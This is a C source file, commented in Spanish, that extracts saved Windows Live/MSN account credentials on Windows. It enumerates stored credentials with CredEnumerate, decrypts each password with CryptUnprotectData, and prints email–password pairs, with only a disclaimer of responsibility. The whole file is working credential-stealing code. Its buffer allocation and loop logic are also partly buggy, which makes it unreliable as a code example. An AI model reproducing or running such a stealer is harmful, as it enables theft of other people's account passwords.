#include <windows.h>
#include <wincrypt.h>
#include <stdio.h>

//Definimos las p#$%&tas apis
typedef BOOL (WINAPI *_CredEnumerate)(
   LPCTSTR Filter,
   DWORD Flags,
   DWORD *Count,
   LONG **Credentials
);

typedef BOOL (WINAPI *_CryptUnprotectData)(
  DATA_BLOB *pDataIn,
  LPWSTR *ppszDataDescr,
  DATA_BLOB *pOptionalEntropy,
  PVOID pvReserved,
  LONG *pPromptStruct,
  DWORD dwFlags,
  DATA_BLOB *pDataOut
);

LONG ptr_numero;

char ** msn()
{
  // FUNCION DE EXTRACCION DE CREDENCIALES DE MSN
  // TRADUCIDO Y EXTENDIDO POR Linkgl
  // No me hago responsable por el uso que se le de a la funcion
  // Thanks to a vbmodule (doesn't have the name of the coder)
  // and msdn
  //Estructura DATA BLOB y variables que almacenaran direcciones de memoria

  CRYPT_INTEGER_BLOB dtb;
  int i;
  LONG ptr_credenciales;
  LONG ptr;
  LONG usr;

  char *user;
  BOOL check;
  
  //key
  char *app={"WindowsLive:name=*"};

  //Sacamos las apis de las dll
  _CredEnumerate __CredEnumerate = NULL;
  __CredEnumerate = (_CredEnumerate)GetProcAddress(LoadLibrary("Advapi32.dll"), "CredEnumerateA");
  _CryptUnprotectData __CryptUnprotectData = NULL;
  __CryptUnprotectData = (_CryptUnprotectData)GetProcAddress(LoadLibrary("Crypt32.dll"), "CryptUnprotectData");

  //Sacamos las credenciales SOLO de windowslive
  //y las almacenamos en un puntero que apunta a un array de punteros XD
  check =__CredEnumerate(app,0,&ptr_numero,&ptr_credenciales);
  
  if(check == FALSE)
  {
     return NULL;
  }
  
  else
  {
     char **cuenta = (char **)malloc(ptr_numero);
    
     for(i = 0; i < ptr_numero; i++) 
        {
         cuenta[i] = (char*)malloc(100);
         ZeroMemory(cuenta[i], 100);
        }
        
    //Hacemos un bucle hasta sacar todas las credenciales existentes
    for(i=0;i<=ptr_numero-1;i++)
    {
      int o;
      char *temp; 
      char *temp_user; 
      int tam_user;
      
      //aca movemos la direccion de las credenciales al puntero
      memcpy(&ptr,ptr_credenciales+i*4,0x4);
      
      //sacamos el msn
      memcpy(&usr,ptr+48,0x4);
      
      //rellenamos la estructura DATA BLOB (con el pass encryptado)
      memcpy(&dtb.pbData,ptr+28,0x4);
      memcpy(&dtb.cbData,ptr+24,0x4);
      
      if(dtb.pbData == NULL) continue;
      
      //desencriptamos los datos de la estructura (ver msdn :P)
      __CryptUnprotectData(&dtb,0,0,0,0,1,0);
      
      //reservamos el tamaño del pass
      //la estructura contiene la pass y el tamaño*2
      //tonses la dividimos xDD
      temp=(char *)malloc(dtb.cbData/2);
      memset(temp,0,dtb.cbData/2+1);
     
      //copiamos el primer caracter de la pass
      memcpy(&temp[0],&dtb.pbData[0],1);
      
      //bucle del 2do caracter al ultimo
      for(o=1;o<dtb.cbData/2;o++)
      {
        //copiamos la pass caracter x caracter
        //saltando 1 byte nulo
        memcpy(&temp[o],&dtb.pbData[o*2],1);
      }
      
      //sacamos el tamaño del user
      tam_user=lstrlen(usr);
      
      //reservamos la ultima cadena del tamaño del user + la pass
      temp_user=(char *)malloc( (tam_user+2)+dtb.cbData/2);
      memset(temp_user,0,(tam_user+2)+dtb.cbData/2+1);
      
      //copiamos el correo
      memcpy(temp_user,usr,tam_user);
      temp_user[tam_user] = ' ';
      
      
      //bucle para pegar el user y pass
      for(o = tam_user+1 ; o<(tam_user)+dtb.cbData/2;o++)
      {
       printf("%s", temp_user);
         getchar();
        //pegamos la pass al final del correo
        memcpy(&temp_user[o],&temp[o - (tam_user)],1);
      }
       printf("%s", temp_user);
         getchar();
        
      
      //retornamos user + pass
      strncpy(cuenta[i], temp_user, tam_user+dtb.cbData/2);
     
      free(temp);
      free(temp_user);         
     
      printf("");
     
     }
    
    return cuenta;
    
  }
}

int main()
{
  int i;  
  char **ejemplo = msn();
  
  for(i=1; i < ptr_numero; i++)
  printf("\n%s", ejemplo[i]) ;
  
  getchar();
  free(ejemplo);
  
  return 0;
}
